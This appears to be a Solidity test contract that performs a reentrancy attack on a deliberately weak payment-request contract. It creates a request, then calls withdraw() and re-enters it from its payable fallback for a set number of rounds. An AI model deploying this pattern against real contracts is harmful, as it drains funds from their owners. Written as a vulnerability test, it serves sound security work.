pragma solidity 0.4.18;

contract RequestEthereumWeak {

    function createRequestAsPayee(address _payer, uint _amountExpected, address _extension, bytes32[9] _extensionParams) public returns(uint);

    function withdraw() public;

}


contract TestRequestReentrance {

    address contractAdd;
    uint8 round;

    event Log(uint id);

    function TestRequestReentrance(address _contract, uint8 _round) public {
        contractAdd = _contract;
        round = _round;
    }

    function init(address _payer) public {
        RequestEthereumWeak weakContract = RequestEthereumWeak(contractAdd);
        bytes32[9] memory empty;
        uint id = weakContract.createRequestAsPayee(_payer, 100000000000000000, 0, empty);
        Log(id);
    }

    function start() public {
        round--;
        RequestEthereumWeak weakContract = RequestEthereumWeak(contractAdd);
        weakContract.withdraw();
    }

    // Launcher -------------------------------------------------
    function ()
        public
        payable
    {   
        if(round != 0) {
            round--;
            RequestEthereumWeak weakContract = RequestEthereumWeak(contractAdd);
            weakContract.withdraw();
        }
    } 
}

